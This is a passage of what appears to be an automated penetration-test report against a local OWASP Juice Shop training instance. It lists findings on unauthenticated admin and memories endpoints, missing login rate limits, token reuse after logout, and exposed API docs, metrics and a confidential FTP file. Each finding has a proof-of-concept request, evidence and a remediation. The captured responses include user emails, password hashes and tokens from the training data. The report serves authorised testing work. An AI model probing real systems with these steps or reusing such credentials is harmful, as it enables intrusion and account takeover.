{"config":{"server":{"port":3000,"basePath":"","baseUrl":"http://localhost:3000"},"application":{"domain":"juice-sh.op","name":"OWASP Juice Shop","logo":"JuiceShop_Logo.png","favicon":"favicon_js.ico","theme":"bluegrey-lightgreen","showVersionNumber":true,"showGitHubLinks":true,"localBackupEnabled":true,"numberOfRandomFakeUsers":0,"altcoinName":"Juicycoin","privacyContactEmail":"donotreply@owasp-juice.shop","customMetricsPrefix":"juiceshop","chatBot":{"name":"Juicy","greeting":"Nice to meet you <customer-name>, I'm <bot-name>","trainingData":"botDefaultTrainingData.json","defaultResponse":"Sorry I couldn't understand what you were trying to say","avatar":"JuicyChatBot.png"},"social":{"blueSkyUrl":"https://bsky.app/profile/owasp-juice.shop","mastodonUrl":"https://fosstodon.org/@owasp_juiceshop","twitterUrl":"https://twitter.com/owasp_juiceshop","facebookUrl":"https://www.facebook.com/owasp.juiceshop","slackUrl":"https://owasp.org/slack/invite","redditUrl":"https://www.reddit.com/r/owasp_juiceshop","pressKitUrl":"https://github.com/OWASP/owasp-swag/tree/master/projects/juice-shop","nftUrl":"https://opensea.io/collection/juice-shop","questionnaireUrl":null},"recyclePage":{"topProductImage":"fruit_press.jpg","bottomProductImage":"apple_pressings.jpg"},"welcomeBanner":{"showOnFirstStart":true,"title":"Welcome to OWASP Juice Shop!","message":"<p>Being a web application with a vast number of intended security vulnerabilities, the <strong>OWASP Juice Shop</strong> is supposed to be the opposite of a best practice or template application for web developers: It is an awareness, training, demonstration and exercise tool for security risks in modern web applications. The <strong>OWASP Juice Shop</strong> is an open-source project hosted by the non-profit <a href='https://owasp.org' target='_blank'>Open Worldwide Application Security Project (OWASP)</a> and is developed and maintained by volunteers. Check out the link below for more information and documentation on the project.</p><h1><a href='https://owasp-juice.shop' target='_blank'>https://owasp-juice.shop</a></h1>"},"cookieConsent":{"message":"This website uses fruit cookies to ensure you get the juiciest tracking experience.","dismissText":"Me want it!","linkText":"But me wait!","linkUrl":"https://www.youtube.com/watch?v=9PnbKL3wuH4"},"securityTxt":{"contact":"mailto:donotreply@owasp-juice.shop","encryption":"https://keybase.io/bkimminich/pgp_keys.asc?fingerprint=19c01cb7157e4645e9e2c863062a85a8cbfbdcda","acknowledgements":"/#/score-board","hiring":"/#/jobs","csaf":"/.well-known/csaf/provider-metadata.json"},"promotion":{"video":"owasp_promo.mp4","subtitles":"owasp_promo.vtt"},"easterEggPlanet":{"name":"Orangeuze","overlayMap":"orangemap2k.jpg"},"googleOauth":{"clientId":"1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com","authorizedRedirects":[{"uri":"https://demo.owasp-juice.shop"},{"uri":"https://juice-shop.herokuapp.com"},{"uri":"https://preview.owasp-juice.shop"},{"uri":"https://juice-shop-staging.herokuapp.com"},{"uri":"https://juice-shop.wtf"},{"uri":"http://localhost:3000","proxy":"https://local3000.owasp-juice.shop"},{"uri":"http://127.0.0.1:3000","proxy":"https://local3000.owasp-juice.shop"},{"uri":"http://localhost:4200","proxy":"https://local4200.owasp-juice.shop"},{"uri":"http://127.0.0.1:4200","proxy":"https://local4200.owasp-juice.shop"},{"uri":"http://192.168.99.100:3000","proxy":"https://localmac.owasp-juice.shop"},{"uri":"http://192.168.99.100:4200","proxy":"https://localmac.owasp-juice.shop"},{"uri":"http://penguin.termina.linux.test:3000","proxy":"https://localchromeos.owasp-juice.shop"},{"uri":"http://penguin.termina.linux.test:4200","proxy":"https://localchromeos.owasp-juice.shop"}]}},"challenges":{"showSolvedNotifications":true,"showHints":true,"showMitigations":true,"codingChallengesEnabled":"solved","restrictToTutorialsFirst":false,"overwriteUrlForProductTamperingChallenge":"https://owasp.slack.com","xssBonusPayload":"<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true\"></iframe>","safetyMode":"auto","csafHashValue":"7e7ce7c65db3bf0625fcea4573d25cff41f2f7e3474f2c74334b14fc65bb4fd26af802ad17a3a03bf0eee6827a00fb8f7905f338c31b5e6ea9cb31620242e843","metricsIgnoredUserAgents":["Prometheus","Alloy","promscrape","otelcol"]},"hackingInstructor":{"isEnabled":true,"avatarImage":"JuicyBot.png","hintPlaybackSpeed":"normal"},"products":[{"name":"Apple Juice (1000ml)","price":1.99,"deluxePrice":0.99,"limitPerUser":5,"description":"The all-time classic.","image":"apple_juice.jpg","reviews":[{"text":"One of my favorites!","author":"admin"}]},{"name":"Orange Juice (1000ml)","description":"Made from oranges hand-picked by Uncle Dittmeyer.","price":2.99,"deluxePrice":2.49,"image":"orange_juice.jpg","reviews":[{"text":"y0ur f1r3wall needs m0r3 musc13","author":"uvogin"}]},{"name":"Eggfruit Juice (500ml)","description":"Now with even more exotic flavour.","price":8.99,"image":"eggfruit_juice.jpg","reviews":[{"text":"I bought it, would buy again. 5/7","author":"admin"}]},{"name":"Raspberry Juice (1000ml)","description":"Made from blended Raspberry Pi, water and sugar.","price":4.99,"image":"raspberry_juice.jpg"},{"name":"Lemon Juice (500ml)","description":"Sour but full of vitamins.","price":2.99,"deluxePrice":1.99,"limitPerUser":5,"image":"lemon_juice.jpg"},{"name":"Banana Juice (1000ml)","description":"Monkeys love it the most.","price":1.99,"image":"banana_juice.jpg","reviews":[{"text":"Fry liked it too.","author":"bender"}]},{"name":"OWASP Juice Shop T-Shirt","description":"Real fans wear it 24/7!","price":22.49,"limitPerUser":5,"image":"fan_shirt.jpg"},{"name":"OWASP Juice Shop CTF Girlie-Shirt","description":"For serious Capture-the-Flag heroines only!","price":22.49
```

### 20. Unauthenticated sensitive endpoint exposure: GET /rest/admin/application-version
- Severity: HIGH
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: unknown
- Impact Bound: not recorded
- State Changed: unknown
- Cleanup Attempted: unknown
- Vector Explanation: Endpoint `/rest/admin/application-version` returned HTTP 200 without authentication.

**Proof Of Concept**
GET http://192.168.1.221:3001/rest/admin/application-version without authentication

**Evidence**
http://192.168.1.221:3001/rest/admin/application-version returned HTTP 200 unauthenticated.

**Remediation**
Require authentication and authorization checks for sensitive endpoints and files.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/rest-admin-application-version.txt

```text
URL: http://192.168.1.221:3001/rest/admin/application-version
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 20
ETag: W/"14-tCKnqyl1elU2Vzkywa8P9qRtJx4"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:32 GMT
Connection: close

Body Snippet:
{"version":"19.2.1"}
```

### 21. Unauthenticated sensitive endpoint exposure: GET /rest/memories/
- Severity: HIGH
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Sensitive-looking endpoint `/rest/memories/` returned HTTP 200 without authentication.

**Proof Of Concept**
GET http://192.168.1.221:3001/rest/memories/

**Evidence**
`GET http://192.168.1.221:3001/rest/memories/` returned HTTP 200.

**Remediation**
Require authentication and object-level authorization for sensitive API and file endpoints.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/rest-memories.txt

```text
URL: http://192.168.1.221:3001/rest/memories/
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 6183
ETag: W/"1827-FLXwtGVq1ZZ5PAuPZEt2ybdDVpg"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:32 GMT
Connection: close

Body Snippet:
{"status":"success","data":[{"UserId":13,"id":1,"caption":"😼 #zatschi #whoneedsfourlegs","imagePath":"assets/public/images/uploads/ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg","createdAt":"2026-04-20T15:56:24.840Z","updatedAt":"2026-04-20T15:56:24.840Z","User":{"id":13,"username":"","email":"bjoern@owasp.org","password":"9283f1b2e9669749081963be0462e466","role":"deluxe","deluxeToken":"efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4","lastLoginIp":"","profileImage":"assets/public/images/uploads/13.jpg","totpSecret":"","isActive":true,"createdAt":"2026-04-20T15:56:19.929Z","updatedAt":"2026-04-20T15:56:19.929Z","deletedAt":null}},{"UserId":4,"id":2,"caption":"Magn(et)ificent!","imagePath":"assets/public/images/uploads/magn(et)ificent!-1571814229653.jpg","createdAt":"2026-04-20T15:56:24.841Z","updatedAt":"2026-04-20T15:56:24.841Z","User":{"id":4,"username":"bkimminich","email":"bjoern.kimminich@gmail.com","password":"6edd9d726cbdc873c539e41ae8757b8c","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","totpSecret":"","isActive":true,"createdAt":"2026-04-20T15:56:19.925Z","updatedAt":"2026-04-20T15:56:19.925Z","deletedAt":null}},{"UserId":4,"id":3,"caption":"My rare collectors item! [̲̅$̲̅(̲̅ ͡° ͜ʖ ͡°̲̅)̲̅$̲̅]","imagePath":"assets/public/images/uploads/my-rare-collectors-item!-[̲̅$̲̅(̲̅-͡°-͜ʖ-͡°̲̅)̲̅$̲̅]-1572603645543.jpg","createdAt":"2026-04-20T15:56:24.841Z","updatedAt":"2026-04-20T15:56:24.841Z","User":{"id":4,"username":"bkimminich","email":"bjoern.kimminich@gmail.com","password":"6edd9d726cbdc873c539e41ae8757b8c","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","totpSecret":"","isActive":true,"createdAt":"2026-04-20T15:56:19.925Z","updatedAt":"2026-04-20T15:56:19.925Z","deletedAt":null}},{"UserId":21,"id":4,"caption":"Welcome to the Bee Haven (/#/bee-haven)🐝","imagePath":"assets/public/images/uploads/BeeHaven.png","createdAt":"2026-04-20T15:56:24.842Z","updatedAt":"2026-04-20T15:56:24.842Z","User":{"id":21,"username":"evmrox","email":"ethereum@juice-sh.op","password":"2c17c6393771ee3048ae34d6b380c5ec","role":"deluxe","deluxeToken":"b49b30b294d8c76f5a34fc243b9b9cccb057b3f675b07a5782276a547957f8ff","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","totpSecret":"","isActive":true,"createdAt":"2026-04-20T15:56:19.931Z","updatedAt":"2026-04-20T15:56:19.931Z","deletedAt":null}},{"UserId":13,"id":5,"caption":"Sorted the pieces, starting assembly process...","imagePath":"assets/public/images/uploads/sorted-the-pieces,-starting-assembly-process-1721152307290.jpg","createdAt":"2026-04-20T15:56:24.842Z","updatedAt":"2026-04-20T15:56:24.842Z","User":{"id":13,"username":"","email":"bjoern@owasp.org","password":"9283f1b2e9669749081963be0462e466","role":"deluxe","deluxeToken":"efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4","lastLoginIp":"","profileImage":"assets/public/images/uploads/13.jpg","totpSecret":"","isActive":true,"createdAt":"2026-04-20T15:56:19.929Z","updatedAt":"2026-04-20T15:56:19.929Z","deletedAt":null}},{"UserId":13,"id":6,"caption":"Building something literally bottom up...","imagePath":"assets/public/images/uploads/building-something-literally-bottom-up-1721152342603.jpg","createdAt":"2026-04-20T15:56:24.842Z","updatedAt":"2026-04-20T15:56:24.842Z","User":{"id":13,"username":"","email":"bjoern@owasp.org","password":"9283f1b2e9669749081963be0462e466","role":"deluxe","deluxeToken":"efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4","lastLoginIp":"","profileImage":"assets/public/images/uploads/13.jpg","totpSecret":"","isActive":true,"createdAt":"2026-04-20T15:56:19.929Z","updatedAt":"2026-04-20T15:56:19.929Z","deletedAt":null}},{"UserId":13,"id":7,"caption":"Putting in the hardware...","imagePath":"assets/public/images/uploads/putting-in-the-hardware-1721152366854.jpg","createdAt":"2026-04-20T15:56:24.842Z","updatedAt":"2026-04-20T15:56:24.842Z","User":{"id":13,"username":"","email":"bjoern@owasp.org","password":"9283f1b2e9669749081963be0462e466","role":"deluxe","deluxeToken":"efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4","lastLoginIp":"","profileImage":"assets/public/images/uploads/13.jpg","totpSecret":"","isActive":true,"createdAt":"2026-04-20T15:56:19.929Z","updatedAt":"2026-04-20T15:56:19.929Z","deletedAt":null}},{"UserId":13,"id":8,"caption":"Everything up and running!","imagePath":"assets/public/images/uploads/everything-up-and-running!-1721152385146.jpg","createdAt":"2026-04-20T15:56:24.842Z","updatedAt":"2026-04-20T15:56:24.842Z","User":{"id":13,"username":"","email":"bjoern@owasp.org","password":"9283f1b2e9669749081963be0462e466","role":"deluxe","deluxeToken":"efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4","lastLoginIp":"","profileImage":"assets/public/images/uploads/13.jpg","totpSecret":"","isActive":true,"createdAt":"2026-04-20T15:56:19.929Z","updatedAt":"2026-04-20T15:56:19.929Z","deletedAt":null}},{"UserId":18,"id":9,"caption":"I love going hiking here...","imagePath":"assets/public/images/uploads/favorite-hiking-place.png","createdAt":"2026-04-20T15:56:24.862Z","updatedAt":"2026-04-20T15:56:24.862Z","User":{"id":18,"username":"j0hNny","email":"john@juice-sh.op","password":"00479e957b6b42c459ee5746478e4d45","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","totpSecret":"","isActive":true,"createdAt":"2026-04-20T15:56:19.930Z","updatedAt":"2026-04-20T15:56:19.930Z","deletedAt":null}},{"UserId":19,"id":10,"caption":"My old workplace...","imagePath":"assets/public/images/uploads/IMG_4253.jpg","createdAt":"2026-04-20T15:56:24.871Z","updatedAt":"2026-04-20T15:56:24.871Z","User":{"id":19,"username":"E=ma²","email":"emma@juice-sh.op","password":"402f1c4a75e316afec5a6ea63147f739","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.s
```

### 22. Brute-force protection gap: POST /rest/user/login
- Severity: HIGH
- Status: validated
- Confidence: 0.80
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, rce-adjacent
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; single canary mutation where required
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Multiple rapid login attempts did not trigger visible rate-limit or lockout controls.

**Proof Of Concept**
Send 8 failed login attempts to http://192.168.1.221:3001/rest/user/login and confirm no 429/lockout response.

**Evidence**
8 rapid failed attempts completed in 0.32s with statuses [401, 401, 401, 401, 401, 401, 401, 401].

**Remediation**
Enforce account/IP rate limits, progressive backoff, and temporary lockouts on repeated failures.

### 23. Session token replay signal after logout
- Severity: HIGH
- Status: validated
- Confidence: 0.79
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: persistence-adjacent, credential-exposure
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; harmless marker payload only; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Bearer token remained usable after logout attempt, indicating weak server-side token invalidation controls.

**Proof Of Concept**
Authenticate, attempt logout, then re-use the same token on whoami/profile endpoint.

**Evidence**
`GET http://192.168.1.221:3001/rest/user/whoami` remained accessible with the same token after logout attempt.

**Remediation**
Implement token revocation or short-lived tokens with rotation and server-side invalidation checks.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/rest-user-whoami-after-logout.txt

```text
URL: http://192.168.1.221:3001/rest/user/whoami
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 125
ETag: W/"7d-GvyDAsmsTTBBUVqZZ6hoqGframA"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:34 GMT
Connection: close

Body Snippet:
{"user":{"id":1,"email":"admin@juice-sh.op","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png"}}
```

### 24. Public API documentation exposure
- Severity: MEDIUM
- Status: validated
- Confidence: 0.84
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: `/api-docs` returned HTTP 200 with sensitive operational content.

**Proof Of Concept**
GET http://192.168.1.221:3001/api-docs

**Evidence**
`GET http://192.168.1.221:3001/api-docs` returned HTTP 200.

**Remediation**
Restrict API documentation to trusted users or remove privileged routes from public docs.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/api-docs.txt

```text
URL: http://192.168.1.221:3001/api-docs
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: text/html; charset=utf-8
Content-Length: 3106
ETag: W/"c22-H8FH9nKD8DeX/nvIRrte6ZjP2a4"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:32 GMT
Connection: close

Body Snippet:

<!-- HTML for static distribution bundle build -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  
  <title>Swagger UI</title>
  <link rel="stylesheet" type="text/css" href="./swagger-ui.css" >
  <link rel="icon" type="image/png" href="./favicon-32x32.png" sizes="32x32" /><link rel="icon" type="image/png" href="./favicon-16x16.png" sizes="16x16" />
  <style>
    html
    {
      box-sizing: border-box;
      overflow: -moz-scrollbars-vertical;
      overflow-y: scroll;
    }
    *,
    *:before,
    *:after
    {
      box-sizing: inherit;
    }

    body {
      margin:0;
      background: #fafafa;
    }
  </style>
</head>

<body>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position:absolute;width:0;height:0">
  <defs>
    <symbol viewBox="0 0 20 20" id="unlocked">
      <path d="M15.8 8H14V5.6C14 2.703 12.665 1 10 1 7.334 1 6 2.703 6 5.6V6h2v-.801C8 3.754 8.797 3 10 3c1.203 0 2 .754 2 2.199V8H4c-.553 0-1 .646-1 1.199V17c0 .549.428 1.139.951 1.307l1.197.387C5.672 18.861 6.55 19 7.1 19h5.8c.549 0 1.428-.139 1.951-.307l1.196-.387c.524-.167.953-.757.953-1.306V9.199C17 8.646 16.352 8 15.8 8z"></path>
    </symbol>

    <symbol viewBox="0 0 20 20" id="locked">
      <path d="M15.8 8H14V5.6C14 2.703 12.665 1 10 1 7.334 1 6 2.703 6 5.6V8H4c-.553 0-1 .646-1 1.199V17c0 .549.428 1.139.951 1.307l1.197.387C5.672 18.861 6.55 19 7.1 19h5.8c.549 0 1.428-.139 1.951-.307l1.196-.387c.524-.167.953-.757.953-1.306V9.199C17 8.646 16.352 8 15.8 8zM12 8H8V5.199C8 3.754 8.797 3 10 3c1.203 0 2 .754 2 2.199V8z"/>
    </symbol>

    <symbol viewBox="0 0 20 20" id="close">
      <path d="M14.348 14.849c-.469.469-1.229.469-1.697 0L10 11.819l-2.651 3.029c-.469.469-1.229.469-1.697 0-.469-.469-.469-1.229 0-1.697l2.758-3.15-2.759-3.152c-.469-.469-.469-1.228 0-1.697.469-.469 1.228-.469 1.697 0L10 8.183l2.651-3.031c.469-.469 1.228-.469 1.697 0 .469.469.469 1.229 0 1.697l-2.758 3.152 2.758 3.15c.469.469.469 1.229 0 1.698z"/>
    </symbol>

    <symbol viewBox="0 0 20 20" id="large-arrow">
      <path d="M13.25 10L6.109 2.58c-.268-.27-.268-.707 0-.979.268-.27.701-.27.969 0l7.83 7.908c.268.271.268.709 0 .979l-7.83 7.908c-.268.271-.701.27-.969 0-.268-.269-.268-.707 0-.979L13.25 10z"/>
    </symbol>

    <symbol viewBox="0 0 20 20" id="large-arrow-down">
      <path d="M17.418 6.109c.272-.268.709-.268.979 0s.271.701 0 .969l-7.908 7.83c-.27.268-.707.268-.979 0l-7.908-7.83c-.27-.268-.27-.701 0-.969.271-.268.709-.268.979 0L10 13.25l7.418-7.141z"/>
    </symbol>

    <symbol viewBox="0 0 24 24" id="jump-to">
      <path d="M19 7v4H5.83l3.58-3.59L8 6l-6 6 6 6 1.41-1.41L5.83 13H21V7z"/>
    </symbol>

    <symbol viewBox="0 0 24 24" id="expand">
      <path d="M10 18h4v-2h-4v2zM3 6v2h18V6H3zm3 7h12v-2H6v2z"/>
    </symbol>

  </defs>
</svg>

<div id="swagger-ui"></div>

<script src="./swagger-ui-bundle.js"> </script>
<script src="./swagger-ui-standalone-preset.js"> </script>
<script src="./swagger-ui-init.js"> </script>

<style>
  .swagger-ui .topbar .download-url-wrapper { display: none } undefined
</style>
</body>

</html>
```

### 25. Public metrics endpoint exposes runtime telemetry
- Severity: MEDIUM
- Status: validated
- Confidence: 0.84
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: `/metrics` returned HTTP 200 with sensitive operational content.

**Proof Of Concept**
GET http://192.168.1.221:3001/metrics

**Evidence**
`GET http://192.168.1.221:3001/metrics` returned HTTP 200.

**Remediation**
Restrict metrics to trusted monitoring networks or authenticated monitoring identities.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/metrics.txt

```text
URL: http://192.168.1.221:3001/metrics
Status: 200
Headers:
Content-Type: text/plain; version=0.0.4; charset=utf-8
Date: Thu, 23 Apr 2026 02:31:32 GMT
Connection: close
Content-Length: 25559

Body Snippet:
# HELP file_uploads_count Total number of successful file uploads grouped by file type.
# TYPE file_uploads_count counter
file_uploads_count{file_type="application/x-yaml",app="juiceshop"} 13

# HELP file_upload_errors Total number of failed file uploads grouped by file type.
# TYPE file_upload_errors counter
file_upload_errors{file_type="application/xml",app="juiceshop"} 14
file_upload_errors{file_type="text/xml",app="juiceshop"} 2

# HELP juiceshop_startup_duration_seconds Duration juiceshop required to perform a certain task during startup
# TYPE juiceshop_startup_duration_seconds gauge
juiceshop_startup_duration_seconds{task="validateConfig",app="juiceshop"} 0.054846607
juiceshop_startup_duration_seconds{task="cleanupFtpFolder",app="juiceshop"} 0.094094154
juiceshop_startup_duration_seconds{task="validatePreconditions",app="juiceshop"} 0.205876591
juiceshop_startup_duration_seconds{task="datacreator",app="juiceshop"} 5.6295478249999995
juiceshop_startup_duration_seconds{task="customizeApplication",app="juiceshop"} 0.016266016
juiceshop_startup_duration_seconds{task="customizeEasterEgg",app="juiceshop"} 0.007159364
juiceshop_startup_duration_seconds{task="ready",app="juiceshop"} 5.745

# HELP process_cpu_user_seconds_total Total user CPU time spent in seconds.
# TYPE process_cpu_user_seconds_total counter
process_cpu_user_seconds_total{app="juiceshop"} 1291.943328

# HELP process_cpu_system_seconds_total Total system CPU time spent in seconds.
# TYPE process_cpu_system_seconds_total counter
process_cpu_system_seconds_total{app="juiceshop"} 449.746599

# HELP process_cpu_seconds_total Total user and system CPU time spent in seconds.
# TYPE process_cpu_seconds_total counter
process_cpu_seconds_total{app="juiceshop"} 1741.689927

# HELP process_start_time_seconds Start time of the process since unix epoch in seconds.
# TYPE process_start_time_seconds gauge
process_start_time_seconds{app="juiceshop"} 1776700577

# HELP process_resident_memory_bytes Resident memory size in bytes.
# TYPE process_resident_memory_bytes gauge
process_resident_memory_bytes{app="juiceshop"} 331853824

# HELP process_virtual_memory_bytes Virtual memory size in bytes.
# TYPE process_virtual_memory_bytes gauge
process_virtual_memory_bytes{app="juiceshop"} 2012065792

# HELP process_heap_bytes Process heap size in bytes.
# TYPE process_heap_bytes gauge
process_heap_bytes{app="juiceshop"} 932741120

# HELP process_open_fds Number of open file descriptors.
# TYPE process_open_fds gauge
process_open_fds{app="juiceshop"} 23

# HELP process_max_fds Maximum number of open file descriptors.
# TYPE process_max_fds gauge
process_max_fds{app="juiceshop"} 524288

# HELP nodejs_eventloop_lag_seconds Lag of event loop in seconds.
# TYPE nodejs_eventloop_lag_seconds gauge
nodejs_eventloop_lag_seconds{app="juiceshop"} 0.006886967

# HELP nodejs_eventloop_lag_min_seconds The minimum recorded event loop delay.
# TYPE nodejs_eventloop_lag_min_seconds gauge
nodejs_eventloop_lag_min_seconds{app="juiceshop"} 0.000864256

# HELP nodejs_eventloop_lag_max_seconds The maximum recorded event loop delay.
# TYPE nodejs_eventloop_lag_max_seconds gauge
nodejs_eventloop_lag_max_seconds{app="juiceshop"} 0.236191743

# HELP nodejs_eventloop_lag_mean_seconds The mean of the recorded event loop delays.
# TYPE nodejs_eventloop_lag_mean_seconds gauge
nodejs_eventloop_lag_mean_seconds{app="juiceshop"} 0.010144390609439287

# HELP nodejs_eventloop_lag_stddev_seconds The standard deviation of the recorded event loop delays.
# TYPE nodejs_eventloop_lag_stddev_seconds gauge
nodejs_eventloop_lag_stddev_seconds{app="juiceshop"} 0.0002603968682951441

# HELP nodejs_eventloop_lag_p50_seconds The 50th percentile of the recorded event loop delays.
# TYPE nodejs_eventloop_lag_p50_seconds gauge
nodejs_eventloop_lag_p50_seconds{app="juiceshop"} 0.010117119

# HELP nodejs_eventloop_lag_p90_seconds The 90th percentile of the recorded event loop delays.
# TYPE nodejs_eventloop_lag_p90_seconds gauge
nodejs_eventloop_lag_p90_seconds{app="juiceshop"} 0.010166271

# HELP nodejs_eventloop_lag_p99_seconds The 99th percentile of the recorded event loop delays.
# TYPE nodejs_eventloop_lag_p99_seconds gauge
nodejs_eventloop_lag_p99_seconds{app="juiceshop"} 0.011214847

# HELP nodejs_active_resources Number of active resources that are currently keeping the event loop alive, grouped by async resource type.
# TYPE nodejs_active_resources gauge
nodejs_active_resources{type="PipeWrap",app="juiceshop"} 2
nodejs_active_resources{type="FSEventWrap",app="juiceshop"} 1
nodejs_active_resources{type="TCPServerWrap",app="juiceshop"} 1
nodejs_active_resources{type="TCPSocketWrap",app="juiceshop"} 1
nodejs_active_resources{type="Timeout",app="juiceshop"} 9
nodejs_active_resources{type="Immediate",app="juiceshop"} 1

# HELP nodejs_active_resources_total Total number of active resources.
# TYPE nodejs_active_resources_total gauge
nodejs_active_resources_total{app="juiceshop"} 15

# HELP nodejs_active_handles Number of active libuv handles grouped by handle type. Every handle type is C++ class name.
# TYPE nodejs_active_handles gauge
nodejs_active_handles{type="Socket",app="juiceshop"} 3
nodejs_active_handles{type="FSWatcher",app="juiceshop"} 1
nodejs_active_handles{type="Server",app="juiceshop"} 1

# HELP nodejs_active_handles_total Total number of active handles.
# TYPE nodejs_active_handles_total gauge
nodejs_active_handles_total{app="juiceshop"} 5

# HELP nodejs_active_requests Number of active libuv requests grouped by request type. Every request type is C++ class name.
# TYPE nodejs_active_requests gauge

# HELP nodejs_active_requests_total Total number of active requests.
# TYPE nodejs_active_requests_total gauge
nodejs_active_requests_total{app="juiceshop"} 0

# HELP nodejs_heap_size_total_bytes Process heap size from Node.js in bytes.
# TYPE nodejs_heap_size_total_bytes gauge
nodejs_heap_size_total_bytes{app="juiceshop"} 126148608

# HELP nodejs_heap_size_used_bytes Process heap size u
```

### 26. Unauthenticated sensitive endpoint exposure: GET /ftp/acquisitions.md
- Severity: MEDIUM
- Status: validated
- Confidence: 0.82
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Sensitive-looking endpoint `/ftp/acquisitions.md` returned HTTP 200 without authentication.

**Proof Of Concept**
GET http://192.168.1.221:3001/ftp/acquisitions.md

**Evidence**
`GET http://192.168.1.221:3001/ftp/acquisitions.md` returned HTTP 200.

**Remediation**
Require authentication and object-level authorization for sensitive API and file endpoints.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/ftp-acquisitions-md.txt

```text
URL: http://192.168.1.221:3001/ftp/acquisitions.md
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 14 Apr 2026 06:47:22 GMT
ETag: W/"38d-19d8abea090"
Content-Type: text/markdown; charset=UTF-8
Content-Length: 909
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:32 GMT
Connection: close

Body Snippet:
# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year.
This will have a significant stock market impact as we will elaborate in
detail in the following paragraph:

Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy
eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam
